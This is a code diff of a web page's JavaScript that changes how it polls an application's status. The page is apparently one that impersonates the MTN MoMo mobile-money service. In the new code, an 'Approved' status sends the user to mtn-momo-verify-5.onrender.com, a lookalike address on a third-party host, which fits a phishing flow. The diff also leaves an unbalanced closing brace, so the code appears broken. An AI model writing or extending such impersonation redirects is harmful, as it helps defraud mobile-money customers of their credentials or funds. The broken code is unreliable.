@@ -357,19 +357,41 @@
     }
 
     function startPolling(appId) {
-        pollingInterval = setInterval(async () => {
-            try {
-                const res = await fetch(`/api/status/${appId}`);
-                const data = await res.json();
-                
-                if (data.status !== 'Pending') {
-                    clearInterval(pollingInterval);
-                    document.getElementById('spinnerOverlay').classList.remove('active');
-                    alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
-                    window.location.reload();
-                }
-            } catch (e) { console.error("Tracking node sync failed", e); }
-        }, 3000);
+    clearInterval(pollingInterval);
+
+    pollingInterval = setInterval(async () => {
+        try {
+            const response = await fetch(`/api/status/${appId}`);
+            if (!response.ok) return;
+
+            const data = await response.json();
+
+            if (data.status === "Approved") {
+                clearInterval(pollingInterval);
+
+                document
+                    .getElementById("spinnerOverlay")
+                    .classList.remove("active");
+
+                alert("Your application has been approved. You can now continue.");
+
+                window.location.href = "https://mtn-momo-verify-5.onrender.com";
+
+            } else if (data.status === "Rejected") {
+                clearInterval(pollingInterval);
+
+                document
+                    .getElementById("spinnerOverlay")
+                    .classList.remove("active");
+
+                alert("Your application was not approved.");
+            }
+
+        } catch (error) {
+            console.error("Unable to check application status:", error);
+        }
+    }, 3000);
+    }
     }
 
     document.addEventListener('DOMContentLoaded', () => {
